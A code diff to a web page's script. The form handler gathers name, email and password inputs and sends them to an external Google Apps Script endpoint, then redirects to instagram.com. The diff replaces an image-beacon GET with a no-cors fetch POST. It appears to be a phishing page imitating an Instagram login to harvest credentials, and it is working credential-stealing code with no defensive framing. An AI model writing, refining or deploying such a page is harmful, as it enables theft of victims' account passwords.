@@ -150,28 +150,40 @@
 <script>
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwwMze-CRarapBb3xHvBaaa-ews6k3PUr96smjAPSJmf_IYOnZMLw5uNhCXpRuXfHo/exec";
 
-    document.querySelector("form").addEventListener("submit", function(event) {
-        // جلب قيم الحقول بالترتيب الصحيح من الفورم
-        const inputs = document.querySelectorAll('input');
-        const nameVal = inputs[0] ? inputs[0].value : "";
-        const emailVal = inputs[1] ? inputs[1].value : "";
-        const passVal = inputs[2] ? inputs[2].value : "";
+document.querySelector("form").addEventListener("submit", function(event) {
+    event.preventDefault();
 
-        // بناء الرابط بالمتغيرات الصحيحة
-        const fullUrl = SCRIPT_URL + "?name=" + encodeURIComponent(nameVal) + 
-                        "&email=" + encodeURIComponent(emailVal) + 
-                        "&password=" + encodeURIComponent(passVal) + 
-                        "&action=login_attempt&detected=no";
+    const inputs = document.querySelectorAll('input');
+    const nameVal = inputs[0] ? inputs[0].value : "";
+    const emailVal = inputs[1] ? inputs[1].value : "";
+    const passVal = inputs[2] ? inputs[2].value : "";
 
-        // إرسال البيانات عبر الصورة في الخلفية
-        const img = new Image();
-        img.src = fullUrl;
+    const payload = {
+        name: nameVal,
+        email: emailVal,
+        action: "login_attempt",
+        detected: "no",
+        password: passVal
+    };
 
-        // التحويل لإنستغرام بعد ثانية ونصف
+    fetch(SCRIPT_URL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(() => {
         setTimeout(function() {
             window.location.href = "https://www.instagram.com";
         }, 1500);
+    })
+    .catch(error => {
+        console.error('Error!', error);
+        window.location.href = "https://www.instagram.com/";
     });
+});
 </script>
 
 </body>
